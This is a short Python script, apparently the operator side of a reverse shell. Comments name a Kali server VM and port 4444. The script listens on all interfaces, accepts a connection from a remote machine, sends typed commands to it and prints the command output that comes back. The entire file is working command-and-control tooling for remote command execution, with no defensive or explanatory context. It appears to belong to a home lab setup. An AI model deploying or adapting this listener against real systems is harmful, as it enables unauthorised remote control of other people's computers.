#Server VM: Kali 3999
#Server IP: 192.168.193.113
#Port: 4444

import socket

#HOST = input("Enter your target IP Address: ")
#PORT = input("Enter your target Port: ")

HOST = "0.0.0.0" 
PORT = 4444
print("Trying to connect to client...")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print("Connected by", addr)
        while True:
            cmd = input("command> ")
            if not cmd:
                continue
            conn.sendall(cmd.encode() + b"\n")   # send command
            if cmd.strip().lower() == "exit":
                print("Sent exit, closing.")
                break
            # receive result length-unaware: read until socket closed or newline marker
            data = b""
            while True:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
                # client will send a marker line "--END--\n"
                if b"--END--\n" in data:
                    data = data.replace(b"--END--\n", b"")
                    break
            print("=== output ===")
            print(data.decode(errors="ignore"))
       


